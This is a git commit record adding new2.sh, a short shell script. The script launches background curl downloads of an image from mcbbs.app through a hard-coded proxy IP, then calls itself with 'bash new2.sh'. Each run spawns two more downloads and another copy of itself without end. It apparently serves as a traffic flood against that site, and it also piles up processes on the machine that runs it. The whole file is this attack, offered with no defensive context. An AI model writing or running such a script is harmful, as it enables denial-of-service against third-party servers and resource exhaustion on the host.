f098fc0a884cc00671323d8d9e5a0a38bee8bb54
xjh2009 <102580788+xjh2009@users.noreply.github.com>
2024-03-09 21:26:27 +0800

    Create new2.sh

---
+++ new2.sh
@@ -0,0 +1,6 @@
+for ((i=1; i<=2; i++))  
+do  
+nohup curl -o /tmp/sbrz https://mcbbs.app/data/attachment/forum/202402/29/234735pbiiaqixa5maxmq5.jpg -x 154.12.36.155:443  > /tmp/mcbbsapp${i}-start.log 2>&1 &
+done
+echo ok
+bash new2.sh
